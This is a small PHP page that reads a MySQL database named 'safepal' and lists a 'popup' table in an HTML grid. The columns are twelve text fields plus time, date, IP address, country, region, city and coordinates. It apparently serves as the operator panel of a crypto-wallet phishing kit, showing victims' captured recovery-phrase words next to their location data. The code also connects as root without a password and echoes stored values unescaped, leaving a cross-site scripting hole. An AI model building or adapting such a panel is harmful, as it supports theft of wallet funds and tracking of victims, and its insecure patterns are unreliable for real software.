<?php

        $conn=mysqli_connect('localhost','root','','safepal');
        if(!$conn){
            echo "Connection failed";
        }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>view</title>
    <style>
        td, th {
  border: 1px solid #ddd;
  padding: 8px;
}

table{
  font-family: Arial, Helvetica, sans-serif;
  border-collapse: collapse;
  width: 100%;
}

tr:nth-child(even){background-color: #f2f2f2;}

tr:hover {background-color: #ddd;}

th {
  padding-top: 12px;
  padding-bottom: 12px;
  text-align: left;
  background-color: #555555;
  color: white;
}
    </style>
</head>
<body>
    
<?php
$sql = "Select * from popup ";
$result = mysqli_query($conn, $sql);
$array = array();
while($fetch = mysqli_fetch_assoc($result)){
$array[]= $fetch;
}

?>

<div>

<table>
    <th>I'D</th>
    <th>Text1</th>
    <th>Text2</th>
    <th>Text3</th>
    <th>Text4</th>
    <th>Text5</th>
    <th>Text6</th>
    <th>Text7</th>
    <th>Text8</th>
    <th>Text9</th>
    <th>Text10</th>
    <th>Text11</th>
    <th>Text12</th>
    <th>Time</th>
    <th>Date</th>
    <th>IP Address</th>
    <th>Contory</th>
    <th>Region</th>
    <th>City</th>
    <th>Lot</th>
    <th>Lon</th>

    <?php
        foreach($array as $view){
?>

    <tr>
        <td>
        <?php
                echo $view['id'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text1'];
                ?>
        </td>
        <td><?php
                echo $view['text2'];
                ?>
                </td>
        <td>
        <?php
                echo $view['text3'];
                ?>
        </td>
        <td> 
        <?php
                echo $view['text4'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text5'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text6'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text7'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text8'];
                ?>
        </td>
        <td><?php
                echo $view['text9'];
                ?></td>
        <td>
        <?php
                echo $view['text10'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text11'];
                ?>
        </td>
        <td>
        <?php
                echo $view['text12'];
                ?>
        </td>
        <td>
        <?php
                echo $view['time'];
                ?>
        </td>
        <td>
        <?php
                echo $view['date'];
                ?>
        </td>
        <td>
        <?php
                echo $view['ip'];
                ?>
        </td>
        <td>
        <?php
                echo $view['country'];
                ?>
        </td>
        <td>
        <?php
                echo $view['region'];
                ?>
        </td>
        <td>
        <?php
                echo $view['city'];
                ?>
        </td>
        <td>
        <?php
                echo $view['lot'];
                ?>
        </td>
        <td>
        <?php
                echo $view['lon'];
                ?>
        </td>
    </tr>

    <?php
        }
    ?>
</table>

</div>






</body>
</html>


